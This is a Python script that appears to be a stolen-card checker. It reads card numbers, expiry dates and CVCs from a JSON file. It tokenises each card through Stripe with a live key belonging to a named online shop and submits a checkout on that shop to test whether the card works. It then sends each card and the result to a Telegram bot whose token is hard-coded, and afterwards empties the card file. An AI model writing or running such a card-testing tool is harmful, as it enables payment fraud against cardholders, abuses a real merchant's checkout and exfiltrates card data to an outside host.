import requests
import json
import os,re,time,random

file_path = 'cards.json'
bot_token = "5556552193:AAGGN0Mfi22qYaennhcLc-lMmqLrwOmi5LY"
chat_id = "1008961594"

def read_cards(file_path):
    with open(file_path, 'r') as file:
    	cards = [json.loads(line) for line in file]
    return cards
    
def process_cards(cards):
    
        for card in cards:
        	formatted_card = f"{card['num']}|{card['month']}|{card['year']}|{card['code']}"
        	nn, mm, yy, cvc = formatted_card.strip().split('|')
        	
        	headers = {
        	'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,hi-IN;q=0.6,hi;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
        	data = f'type=card&billing_details[name]=Ali+Gh&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10009&billing_details[email]=Ali-gh33%40telegmail.com&billing_details[phone]=0994488358&card[number]={nn}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F267a33ee33%3B+stripe-js-v3%2F267a33ee33%3B+split-card-element&referrer=https%3A%2F%2Fal-nadha.com&time_on_page=176778&key=pk_live_51HzoJkDhTL3jxamujcfGoKiSXVXVRxWTOBMWPHoaiwvPtvYdUjAoAn5dxRtYID8nJ2eJNdyTB2OJ8SQB6SlTJsqG005wLErA2T&_stripe_account=acct_1HzoJkDhTL3jxamu&_stripe_version=2022-08-01'

        	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        	#print(response.json())
        	pm = response.json()["id"]
        	
        	
        	cookies = {
        	    '_fbp': 'fb.1.1718466730030.634617056251551572',
    'mailpoet_subscriber': '%7B%22subscriber_id%22%3A43814%7D',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-10%2004%3A22%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fal-nadha.com%2F%23%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-07-10%2004%3A22%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fal-nadha.com%2F%23%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'wcaiocc_user_currency_session': 'EUR',
    'PHPSESSID': '73l4jmm5u9ojgtpjvhhpi11i40',
    'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_gid': 'GA1.2.887455524.1720588878',
    'wp_woocommerce_session_8181e73ab86fda8b24141304097755c5': 't_fb01dd857a2e4683f3f8bc41ab6a09%7C%7C1720761675%7C%7C1720758075%7C%7C1148766088d9b53dd0a83a5a7867d02d',
    'woocommerce_items_in_cart': '1',
    '_ga': 'GA1.2.1890779885.1718466731',
    '_ga_701NGE5REB': 'GS1.1.1720588869.2.1.1720594158.0.0.0',
    'woocommerce_cart_hash': '548c6e177e54b8a870fb6eb16d85f8c5',
    'woocommerce_recently_viewed': '6541%7C537',
    'sbjs_session': 'pgs%3D24%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fal-nadha.com%2Fcheckout%2F',
    'mailpoet_page_view': '%7B%22timestamp%22%3A1720596811%7D',

}
    

        	headers = {
    'authority': 'al-nadha.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,hi-IN;q=0.6,hi;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://al-nadha.com',
    'referer': 'https://al-nadha.com/checkout/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }
    
    
        	params = {
    'wc-ajax': 'checkout',
    }
    
        	data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fal-nadha.com%2F%23&wc_order_attribution_session_start_time=2024-07-10+04%3A22%3A18&wc_order_attribution_session_pages=24&wc_order_attribution_session_count=2&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&billing_first_name=Ali&billing_last_name=Gh&billing_country=US&billing_address_1=New+York&billing_postcode=10009&billing_city=&billing_state=&billing_phone=0994488358&billing_email=Ali-gh33%40telegmail.com&order_comments=&wc-points-rewards-max-points=0&payment_method=stripe_cc&stripe_cc_token_key={pm}&stripe_cc_payment_intent_key=&stripe_cc_save_source_key=yes&stripe_ideal_token_key=&stripe_ideal_payment_intent_key=&stripe_bancontact_token_key=&stripe_bancontact_payment_intent_key=&stripe_giropay_token_key=&stripe_giropay_payment_intent_key=&stripe_sofort_token_key=&stripe_sofort_payment_intent_key=&mailpoet_woocommerce_checkout_optin_present=1&mailpoet_woocommerce_checkout_optin_present=1&terms=on&terms-field=1&woocommerce-process-checkout-nonce=46bdab1400&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
    
    

        	response = requests.post('https://al-nadha.com/', params=params, cookies=cookies, headers=headers, data=data)
        	html_message = response.json()["messages"]
        	cleanr = re.compile('<.*?>')
        	cleanmessage = re.sub(cleanr, '', html_message)
        	result = cleanmessage.strip()
    
    ### Send To Telegram bot 
        	requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",params={"chat_id": chat_id,"text": f"{formatted_card.strip()} ----> {response.json()}"})
    ###
 
        
                      
        
        
if __name__ == "__main__":    
    cards = read_cards(file_path)
    process_cards(cards)
    with open(file_path, 'w') as file:
    	file.write('')
